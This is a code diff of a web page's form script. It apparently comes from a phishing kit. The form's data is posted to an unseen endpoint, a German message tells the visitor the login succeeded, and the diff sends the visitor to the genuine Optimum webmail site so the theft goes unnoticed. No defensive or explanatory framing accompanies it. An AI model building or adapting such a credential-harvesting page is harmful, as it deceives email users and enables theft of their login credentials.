@@ -73,35 +73,38 @@ function showPage() {
   </p>
 			</div>	 
 <div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
-  ✅ Danke schön! Erfolgreich angemeldet - Weiterleitung zum Portal...
-</div>		
-	<script>
+  ✅ Danke schön! Erfolgreich angemeldet - Weiterleitung zum Portal......
+</div>
+
+<script>
   const form = document.getElementById('contact-form');
   const successMsg = document.getElementById('form-success');
 
   form.addEventListener('submit', function (e) {
-    e.preventDefault(); // Prevent default form submission
+    e.preventDefault();
     const formData = new FormData(form);
 
     fetch(form.action, {
-      method: form.method,
+      method: 'POST',
       body: formData,
       headers: {
-        Accept: 'application/json',
-      },
+        'Accept': 'application/json'
+      }
     }).then(response => {
       if (response.ok) {
-        form.style.display = 'none';
+        form.reset();
         successMsg.style.display = 'block';
         setTimeout(() => {
-          window.location.href = 'https://example.com/thank-you'; // your redirect URL
-        }, 3000);
+          window.location.href = 'https://myemail2.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail';
+        }, 3000); // 3-second delay before redirect
       } else {
-        alert('There was a problem submitting the form.');
+        alert('There was an issue submitting the form. Please try again.');
       }
+    }).catch(error => {
+      alert('There was a network error. Please try again.');
     });
   });
-</script>		
+</script>
             <div>              			
 </div>
 </div>
